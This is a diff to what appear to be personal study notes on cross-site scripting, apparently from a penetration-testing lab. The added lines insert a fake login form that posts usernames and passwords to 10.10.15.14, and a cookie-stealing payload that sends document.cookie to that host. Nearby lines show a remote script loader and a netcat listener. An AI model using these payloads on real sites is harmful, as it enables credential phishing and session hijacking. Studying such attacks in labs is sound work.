@@ -104,6 +104,7 @@ also, you can load remote code with:
 
 * this creates a form on the wesbite, with the action to send the information back to our ip
 * in order to deploy this payload, we can do `document.write(payload)`
+  * document.write('<h3>Please login to continue</h3><form action=http://10.10.15.14><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')
 * to remove other elements, use `document.getElementById(element id).remove()`
 * to get rid of other things, use comments
 * to set up a listener, we just use nc to listen on port 80
@@ -156,7 +157,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 ```
   document.location='http://OUR_IP/index.php?c='+document.cookie;
 ``````
-  new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+  new Image().src='http://10.10.15.14/index.php?c='+document.cookie;
 ```
 the first of these navigates to a cookie grabber page, the second displays an image (which captures our cookie by embedding our php source file)
 
